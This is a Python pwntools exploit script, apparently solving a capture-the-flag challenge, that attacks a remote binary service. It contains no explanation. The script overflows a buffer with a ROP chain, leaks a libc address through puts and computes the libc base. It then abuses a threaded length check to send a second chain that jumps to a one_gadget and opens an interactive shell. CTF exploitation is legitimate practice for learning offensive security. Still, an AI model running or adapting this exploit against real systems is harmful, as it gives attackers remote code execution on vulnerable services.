from pwn import *
#io=process('./pwn')
io=remote("nc1.ctfplus.cn",33536)
libc=ELF('./libc.so.6')
#context.log_level='debug'
def bug():
    gdb.attach(io)
io.sendlineafter(b"Choice: ",b"1")
rdi=0x4012A3
payload=b'a'.ljust(0x20,b'a')+p64(0x4040D0)+p64(rdi)+p64(0x404018)+p64(0x4010C0)
payload+=p64(0x401492)+p64(0x4012F3)
io.send(payload)
io.sendlineafter(b"Choice: ",b"2")
io.sendlineafter(b"Length: ",b'1')

io.sendlineafter(b"Choice: ",b"3")
io.sendline(b"2")
io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
io.sendline(b"512")
io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
base=u64(io.recv(6)+b"\x00\x00")-libc.sym.puts
print(hex(base))
rax=base+0x0000000000045eb0
rbp=base+0x000000000002a2e0
io.sendline(b"1")
io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
payload=p64(0x401492)*8+p64(rax)+p64(0)+p64(rbp)+p64(0x404800)+p64(base+0xebd43)
io.send(payload)

io.interactive()